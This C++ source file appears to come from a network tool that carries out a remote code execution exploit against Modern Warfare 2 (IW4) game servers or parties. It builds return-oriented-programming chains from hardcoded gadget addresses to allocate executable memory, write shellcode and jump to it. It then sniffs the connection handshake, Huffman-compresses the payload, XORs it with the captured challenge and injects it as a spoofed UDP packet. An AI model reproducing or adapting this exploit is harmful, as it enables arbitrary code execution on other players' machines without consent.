#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

#include "Game/MW2/Handler.hpp"
#include "Game/MW2/Client.hpp"

#include "Extern/Huffman.hpp"

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

void allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
{
	// Allocate executable memory
	stack->push_back(0x401000 + 0x000bf17a);  // pop esi
	stack->push_back(0x6D71E4);               // IAT: VirtualAlloc

	stack->push_back(0x401000 + 0x00243074);  // mov eax, [esi]; pop esi
	stack->push_back(0);                      // padding

	stack->push_back(0x401000 + 0x00036a94);  // jmp eax

	stack->push_back(0x401000 + 0x000bf17a);  // pop esi - for saving the memory pointer

	stack->push_back(0);                      // addr
	stack->push_back(size);                   // size
	stack->push_back(MEM_COMMIT);             // addr
	stack->push_back(PAGE_EXECUTE_READWRITE); // permissions

											  // Save memory pointer
	stack->push_back(address);                // Target address
	stack->push_back(0x401000 + 0x0022c4e0);  // mov [esi], eax
}

void writeDataInEax(std::vector<DWORD>* stack, std::string data)
{
	while (data.size() % 4) data.push_back('0');
	for (size_t i = 0; i < data.size(); i += 4)
	{
		stack->push_back(0x401000 + 0x00000860);    // pop ecx
		stack->push_back(*PDWORD(data.data() + i)); // data
		stack->push_back(0x401000 + 0x0000f756);    // mov [eax], ecx
		stack->push_back(0x401000 + 0x000e57cb);    // add eax, 4
	}
}

void freeMemory(std::vector<DWORD>* stack, DWORD address)
{
	stack->push_back(0x401000 + 0x002aa192); // pop edx
	stack->push_back(address);

	stack->push_back(0x401000 + 0x00002b0c); // mov eax, [edx]

	stack->push_back(0x401000 + 0x002aa192); // pop edx
	stack->push_back(0x496D60); // VirtualFree

	stack->push_back(0x401000 + 0x0015a349); // mov [esp + 4], eax; jmp edx

	stack->push_back(0x401000 + 0x002aa192); // pop edx
	stack->push_back(0); // placeholder
}

void WriteDataIW4(std::vector<DWORD>* stack, DWORD address, std::string data, bool fakeRegisters)
{
	// Make sure to append at least 1 endmarker for c strings!
	data.append("\0", 1);

	// Make the data divisible by 4
	for (unsigned int i = 0; i < (4 - (data.size() % 4)); ++i) data.append("\0", 1);

	stack->push_back(0x612303); // pop ebx; ret

	for (unsigned int i = 0; i < data.size(); i += 4)
	{
		// Data that will be popped into ebx
		stack->push_back(*(DWORD*)(data.data() + i));

		// Instruction that pops eax
		stack->push_back(0x404C32); // pop eax; ret

									// Data that will be popped into eax
		stack->push_back(address + i); // pointer to the target memory

									   // Transfer the data and pop ebx
		stack->push_back(0x612301); // mov [eax], ebx; pop ebx; ret
	}

	if (fakeRegisters)
	{
		stack->push_back(0); // fake ebx
	}
}

std::string testExploit()
{
	std::vector<DWORD> stack;

	freeMemory(&stack, UNUSED_MEMORY_POINTER);

	WriteDataIW4(&stack, UNUSED_DATA_POINTER, "This is a hax!", true);

	stack.push_back(0x433940); // Sys_ShowErrorText
	stack.push_back(0x433983); // restore stack
	stack.push_back(UNUSED_DATA_POINTER); // message

	stack.push_back(RESTORE_SERVER_CONTEXT); // restore server


	static unsigned char shellcode[] =
	{
		0x81, 0xEC, 0x68, 0x08, 0x00, 0x00, // sub esp, 868h
		0xC3                                // retn
	};

	std::vector<DWORD> fixup;
	fixup.push_back(0x404C32);  // pop eax
	fixup.push_back(0x31D9390); // old param? not really, but whatever

	allocateMemory(&fixup, UNUSED_MEMORY_POINTER, (sizeof(shellcode) + 3) & ~3);
	writeDataInEax(&fixup, std::string((char*)shellcode, sizeof shellcode));

	// Execute shellcode
	fixup.push_back(0x401000 + 0x002aa192); // pop edx
	fixup.push_back(UNUSED_MEMORY_POINTER);
	fixup.push_back(0x401000 + 0x00002b0c); // mov eax, [edx]
	fixup.push_back(0x401000 + 0x00036a94); // jmp eax

// 	stack.clear();
// 	fixup.clear();
// 
// 	fixup.push_back(0x56A160);
// 	fixup.push_back(0x3172010); // old param

	std::string data;
	data.append(LPSTR(stack.data()), stack.size() * 4);
	data.resize(0x800);
	data.append(LPSTR(fixup.data()), fixup.size() * 4);

	return data;
}

namespace Game
{
	namespace MW2
	{
		Client::Client(Handler* _handler, Network::Address _target) : handler(_handler), target(_target)
		{
			this->onOOB("challengeResponse", [this](Network::Sniffer* /*sniffer*/, Network::Interface* /*networkIf*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				this->challenge = strtoul(data.data(), nullptr, 10);
			});

			this->onOOB("connect", [this](Network::Sniffer* /*sniffer*/, Network::Interface* /*networkIf*/, std::string data, bool receiving)
			{
				static std::regex infoStringRegex("([0-9a-fA-F]+) \"(.+)\"");

				if (!receiving)
				{
					std::smatch match;
					if (std::regex_search(data, match, infoStringRegex) && match.size() >= 3)
					{
						Utils::InfoString info(match[2]);
						this->qport = USHORT(atoi(info.get("qport").data()));
						this->xuid = strtoull(info.get("xuid").data(), nullptr, 16);

						printf("Connecting to party at %s with xuid %llX as %s\n", this->target.toString().data(), this->xuid, info.get("name").data());
					}
				}
			});

			this->onOOB("connectResponse", [this](Network::Sniffer* sniffer, Network::Interface* networkIf, std::string /*data*/, bool receiving)
			{
				if (receiving)
				{
					printf("Connected to server!\n");
					/*MessageBoxA(0, 0, 0, 0);
					this->send(sniffer, networkIf, "\xFF\xFF\xFF\xFF" "relay 1234567890");*/

					Utils::Buffer buffer;
					buffer.write<int>(-2);  // Magic
					buffer.write<int>(1); // Magic seems to get cut off :(
					buffer.write<short>(this->qport); // qport

					buffer.write<char>(0);
					buffer.write<int>(0);
					buffer.write<int>(0);

					auto doHuffman = [](std::string data)
					{
						Huffman_InitMain();

						Utils::Memory::Allocator allocator;
						u_char* target = allocator.allocateArray<u_char>(0x10000 + data.size() * 2);

						int size = MSG_WriteBitsCompress(0, reinterpret_cast<const u_char*>(data.data()), target, data.size());
						return std::string(LPSTR(target), size);
					};

					std::string compr = doHuffman(testExploit());

					for (auto& chr : compr)
					{
						chr ^= char(this->challenge);
					}

					buffer.append(compr);

					this->send(sniffer, networkIf, buffer);
					printf("Sending bytes %s\n", Utils::String::DumpHex(buffer, " ").data());
				}
			});
		}

		Client::~Client()
		{

		}

		void Client::onOOB(std::string command, Callback callback)
		{
			this->oobHandlers[Utils::String(command).toLower()] = callback;
		}

		void Client::send(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string data)
		{
			if (this->packetTemplate.empty()) return;

			Utils::Buffer buffer(this->packetTemplate);
			PBYTE buf = PBYTE(buffer.data());

			ipHeader* ih = nullptr;

			int dlt = pcap_datalink(networkIf->handle);
			if (dlt == DLT_NULL)
			{
				loopbackHeader* protoHeader = reinterpret_cast<loopbackHeader*>(buf);
				if (protoHeader->type == 2) // IPv4
				{
					ih = reinterpret_cast<ipHeader *>(buf + sizeof(loopbackHeader));
				}
			}
			else if (dlt == DLT_EN10MB)
			{
				ethHeader* protoHeader = reinterpret_cast<ethHeader*>(buf);
				if (protoHeader->type == 8) // IPv4
				{
					ih = reinterpret_cast<ipHeader *>(buf + sizeof(ethHeader));
				}
			}

			// Invalid data link type, ip version or protocol
			if (!ih || ih->proto != IPPROTO_UDP) return;

			ih = reinterpret_cast<ipHeader *>(buf + sizeof(ethHeader));

			u_int ipLen = (ih->ver_ihl & 0xF) * 4;
			ih->tlen = htons(u_short(ipLen + sizeof(udpHeader) + data.size()));

			ih->crc = 0;
			ih->crc = Utils::Network::IPChecksum(reinterpret_cast<u_short*>(ih), u_short(ipLen));

			udpHeader* uh = reinterpret_cast<udpHeader *>(PBYTE(ih) + ipLen);
			uh->len = htons(u_short(data.size() + sizeof(udpHeader)));
			uh->crc = 0;
			uh->crc = Utils::Network::UDPChecksum(ih->saddr, ih->daddr, ntohs(uh->sport), ntohs(uh->dport), ih->proto, data);

			buffer.append(data);

			sniffer->send(networkIf, buffer);
		}

		int Client::getDirection(Network::Address source, Network::Address _target)
		{
			if (source == this->target) return Client::PacketDirection::REMOTE_TO_LOCAL;
			if (_target == this->target) return Client::PacketDirection::LOCAL_TO_REMOTE;

			return Client::PacketDirection::NONE;
		}

		void Client::handle(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string_view data, std::string_view rawData, bool receiving)
		{
			if (!receiving && this->packetTemplate.empty())
			{
				this->packetTemplate = rawData.substr(0, rawData.size() - data.size());
			}

			if (!this->handleOOB(sniffer, networkIf, data, receiving))
			{
				this->handleNetchan(sniffer, networkIf, data, receiving);
			}
		}

		bool Client::handleOOB(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string_view data, bool receiving)
		{
			if (data.size() >= 4 && !std::memcmp(data.data(), "\xFF\xFF\xFF\xFF", 4))
			{
				Utils::String command;
				for (auto i = data.begin() + 4; i != data.end(); ++i)
				{
					if (*i == '\0' || *i == '\n' || *i == ' ' || (i + 1) == data.end())
					{
						command = std::string(data.begin() + 4, i);
						break;
					}
				}

				std::string buffer;
				if (data.size() >= command.size() + 5)
				{
					buffer = std::string(data.begin() + command.size() + 5, data.end());
				}

				auto callback = this->oobHandlers.find(command.toLower());
				if (callback != this->oobHandlers.end())
				{
					callback->second(sniffer, networkIf, buffer, receiving);
				}

				return true;
			}

			return false;
		}

		void Client::handleNetchan(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string_view data, bool receiving)
		{
			// TODO Keep track of the natchan state
			sniffer; networkIf; data; receiving;
		}
	}
}
